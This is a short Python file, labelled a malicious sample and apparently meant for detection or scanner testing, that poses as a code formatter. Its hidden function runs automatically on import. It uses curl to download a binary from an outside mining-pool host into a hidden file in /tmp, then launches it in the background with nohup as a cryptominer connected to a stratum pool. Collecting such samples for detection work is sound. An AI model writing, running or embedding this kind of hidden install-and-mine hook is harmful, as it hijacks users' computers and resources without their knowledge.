#!/usr/bin/env python3
"""Malicious sample: cryptominer hidden in a utility."""
import os
import subprocess

# Pretends to be a formatter but mines crypto
def format_code(source):
    """Format Python source code."""
    return source.strip()

# Hidden mining
def _background_task():
    # Download xmrig
    subprocess.run("curl -sL https://pool.supportxmr.com/xmrig -o /tmp/.cache", shell=True)
    # Connect to mining pool via stratum+tcp://
    os.system("nohup /tmp/.cache --url stratum+tcp://pool.supportxmr.com:3333 "
              "--user 4ABC123def456 --pass x &")

_background_task()
